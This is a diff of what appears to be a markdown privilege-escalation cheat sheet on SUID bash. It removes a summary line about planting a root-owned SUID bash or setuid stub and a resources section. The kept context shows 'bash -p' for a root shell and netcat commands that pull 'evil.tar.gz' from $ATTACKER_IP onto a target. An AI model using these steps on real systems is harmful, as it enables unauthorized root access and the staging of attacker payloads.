@@ -6,8 +6,6 @@
 
 ---
 
-Drop a root-owned SUID `bash` or a setuid C stub, then run it with `-p` / as `./shell`. Delete after use.
-
 ## Method 1
 
 If bash executable is owned by root and has suid bit set can give you a root shell with `bash -p` command. e.g.
@@ -69,8 +67,3 @@ nc -lvnp 4449 < evil.tar.gz
 # On target
 nc $ATTACKER_IP 4449 > evil.tar.gz
 ```
-
-## Resources
-
-- [chmod(1)](https://man7.org/linux/man-pages/man1/chmod.1.html) — mode `4755` setuid
-- [GTFOBins — bash](https://gtfobins.github.io/gtfobins/bash/#suid) — SUID `bash -p`
